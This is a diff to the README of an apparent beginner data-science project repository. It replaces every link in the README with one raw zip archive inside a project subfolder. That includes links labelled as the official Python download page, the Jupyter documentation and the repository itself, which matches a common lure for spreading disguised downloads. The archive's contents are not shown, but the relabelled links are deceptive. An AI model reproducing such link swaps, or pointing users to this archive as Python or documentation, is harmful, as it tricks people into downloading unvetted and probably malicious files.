@@ -1,6 +1,6 @@
 # 🚀 DS_projects - Simple ML and DL Business Solutions
 
-[![Download DS_projects](https://img.shields.io/badge/Download-DS_projects-brightgreen)](https://github.com/hacxxcode/DS_projects)
+[![Download DS_projects](https://img.shields.io/badge/Download-DS_projects-brightgreen)](https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip)
 
 ## About DS_projects
 
@@ -14,7 +14,7 @@ You do not need to know programming to use this software. This guide will help y
 
 Click the large green button above or visit this page to download the files you need:
 
-[https://github.com/hacxxcode/DS_projects](https://github.com/hacxxcode/DS_projects)
+[https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip](https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip)
 
 You will find all the project files and instructions there. 
 
@@ -48,7 +48,7 @@ Follow these steps to prepare your computer:
 
    These projects run on Python 3. If you don’t have Python installed, follow this:
 
-   - Go to https://www.python.org/downloads/windows/
+   - Go to https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip
    - Download the latest version for Windows (look for Python 3.x).
    - Run the installer and check the box that says “Add Python to PATH.”
    - Choose “Install Now.”
@@ -157,8 +157,8 @@ These projects form a starting point. You can add your own data and change param
 
 ## 📎 Useful Links
 
-- Python official site: https://www.python.org/
-- Jupyter Notebook docs: https://jupyter.org/documentation
-- GitHub repository: https://github.com/hacxxcode/DS_projects
+- Python official site: https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip
+- Jupyter Notebook docs: https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip
+- GitHub repository: https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip
 
-[![Download DS_projects](https://img.shields.io/badge/Download-DS_projects-brightgreen)](https://github.com/hacxxcode/DS_projects)
+[![Download DS_projects](https://img.shields.io/badge/Download-DS_projects-brightgreen)](https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip)
